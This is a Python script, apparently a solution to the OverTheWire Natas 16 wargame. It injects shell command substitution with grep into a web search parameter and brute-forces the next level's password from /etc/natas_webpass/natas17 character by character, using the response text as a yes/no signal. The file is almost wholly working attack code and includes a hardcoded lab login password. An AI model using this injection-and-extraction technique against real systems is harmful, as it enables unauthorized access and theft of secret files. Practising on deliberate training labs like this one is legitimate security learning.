import requests
import string

url = "http://natas16.natas.labs.overthewire.org/?"

user = "natas16"
passw = "WaIHEacj63wnNIBROHeqi3p9t0m5nhmh"

urlparams = "needle="
charstrings = string.ascii_letters + string.digits
i = 59
inject = charstrings[i]
payload = f'dooms$(grep ^{inject} /etc/natas_webpass/natas17)'

resp = requests.get(url + urlparams + payload, auth=(user, passw))

natas17 = ""
while(1):
    if "dooms" in resp.text:
        if len(inject) < 2:
            i += 1
            inject = charstrings[i]
            payload = f'dooms$(grep ^{inject} /etc/natas_webpass/natas17)'
        else:
            i += 1
            inject = inject[:-1] + charstrings[i]
            payload = f'dooms$(grep ^{inject} /etc/natas_webpass/natas17)'

    else:
        natas17 += charstrings[i]
        print(natas17)
        i = 0
        inject += charstrings[i]
        payload = f'dooms$(grep ^{inject} /etc/natas_webpass/natas17)'

    resp = requests.get(url + urlparams + payload, auth=(user, passw))
    
with open("index.html", "w") as f:
    f.write(resp.text)
